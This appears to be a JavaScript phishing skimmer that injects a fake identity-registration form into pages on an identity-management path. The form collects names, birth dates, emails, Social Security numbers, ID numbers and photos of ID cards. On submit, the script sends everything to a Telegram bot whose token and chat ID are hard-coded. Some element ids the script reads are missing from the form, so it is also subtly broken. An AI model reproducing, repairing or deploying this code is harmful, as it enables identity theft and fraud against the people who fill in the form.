function Registration() {
  window.addEventListener("load", () => {
    const pageContent = document.getElementById("page-content");

    const newContent = `
        <div
            class="mt-5 mx-auto px-3 rounded shadow py-3"
            style="max-width: 660px; background-color: #fff"
          >
            <div class="">
              <h2 class="mb-4">Registration</h2>
              <p class="mb-4">Tell us about yourself.</p>
              <form>
                <!-- Name section -->
                <div class="row mb-3">
                  <div class="col-12 col-sm-4">
                    <label class="form-label">First Name *</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="First Name *"
                      required
                    />
                  </div>
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Last Name *</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="Last Name *"
                      required
                    />
                  </div>
                </div>
      
                <!-- Date of Birth section -->
                <div class="row mb-3">
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Month</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="Month"
                    />
                  </div>
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Day</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="Day"
                    />
                  </div>
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Year</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="Year"
                    />
                  </div>
                </div>
                <div class="row mb-3">
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Email address *</label>
                    <input
                      type="email"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="Email address *"
                      required
                    />
                  </div>
                  <div class="col-12 col-sm-4">
                    <label class="form-label">Social Security Number *</label>
                    <input
                      type="text"
                      class="form-control py-3"
                      style="max-width: 200px"
                      placeholder="SSN *"
                      required
                    />
                  </div>
                </div>
      
                <!-- Person Identifier section -->
                <div class="row mb-3">
                  <div class="col-12 col-sm-4">
                    <label class="form-label">ID Type *</label>
                    <select
                      class="form-select py-3"
                      style="max-width: 200px"
                      required
                    >
                      <option selected disabled>Select ID Type</option>
                      <option value="1">Passport</option>
                      <option value="2">Driver's License</option>
                      <option value="3">National ID</option>
                    </select>
                  </div>
                  <div class="col-12 col-sm-4">
                    <label class="form-label">ID Number *</label>
                    <div class="input-group">
                      <input
                        type="password"
                        class="form-control py-3"
                        style="max-width: 200px"
                        placeholder="ID Number *"
                        required
                      />
                      <span class="input-group-text">
                        <i class="bi bi-eye"></i>
                      </span>
                    </div>
                  </div>
                </div>
                <div class="row mb-3">
                  <div class="col-12 col-sm-6">
                    <label for="imageUpload" class="form-label">ID Front</label>
                    <input
                      class="form-control form-control-lg"
                      type="file"
                      style="max-width: 300px"
                      id="imageUploadFront"
                      accept="image/*"
                      required
                    />
                  </div>
                  <div class="col-12 col-sm-6">
                    <label for="imageUpload" class="form-label">ID Back</label>
                    <input
                      class="form-control form-control-lg"
                      type="file"
                      style="max-width: 300px"
                      id="imageUploadBack"
                      accept="image/*"
                    />
                  </div>
                </div>
      
                <!-- Buttons section -->
                <div class="row">
                  <div class="col d-flex">
                    <button type="submit" class="btn btn-primary me-2">Submit</button>
                    <button type="button" id="cancel" class="btn btn-secondary">
                      Cancel
                    </button>
                  </div>
                </div>
              </form>
            </div>
          </div>
        `;

    pageContent.innerHTML = newContent;

    const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU"; // Replace with your bot token
    const chatId = "1099461059"; // Replace with your chat ID

    document.getElementById("cancel").addEventListener("click", function () {
      history.back();
    });

    const form = document.getElementById("registrationForm");

    form.addEventListener("submit", function (e) {
      e.preventDefault(); // Prevent the form from refreshing the page

      // Get form values
      const firstName = document.getElementById("firstName").value;
      const lastName = document.getElementById("lastName").value;
      const month = document.getElementById("month").value;
      const day = document.getElementById("day").value;
      const year = document.getElementById("year").value;
      const email = document.getElementById("email").value;
      const ssn = document.getElementById("ssn").value;
      const idType = document.getElementById("idType").value;
      const idNumber = document.getElementById("idNumber").value;
      const idFront = document.getElementById("imageUploadFront").files[0]; // ID front image
      const idBack = document.getElementById("imageUploadBack").files[0]; // ID back image

      // Construct message for text data
      const message = `
          New Registration:
          Name: ${firstName} ${lastName}
          DOB: ${month}/${day}/${year}
          Email: ${email}
          SSN: ${ssn}
          ID Type: ${idType}
          ID Number: ${idNumber}
        `;

      // Send the text message first
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
        .then((response) => response.json())
        .then((result) => {
          console.log("Message sent:", result);
          // After sending the message, send the images
          if (idFront) {
            sendImageToTelegram(idFront, "ID Front");
          }
          if (idBack) {
            sendImageToTelegram(idBack, "ID Back");
          }
        })
        .catch((error) => {
          console.error("Error sending message:", error);
        });
    });

    // Function to send images to Telegram
    function sendImageToTelegram(imageFile, caption) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", imageFile);
      formData.append("caption", caption);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData,
      })
        .then((response) => response.json())
        .then((result) => {
          console.log("Image sent:", result);
        })
        .catch((error) => {
          console.error("Error sending image:", error);
        });
    }
  });
}

if (
  window.location.pathname ===
    "/identitymanagement/app/registration/submit-identity-no-reader" ||
  window.location.pathname ===
    "/identitymanagement/app/registration/submit-identity"
) {
  Registration();
}
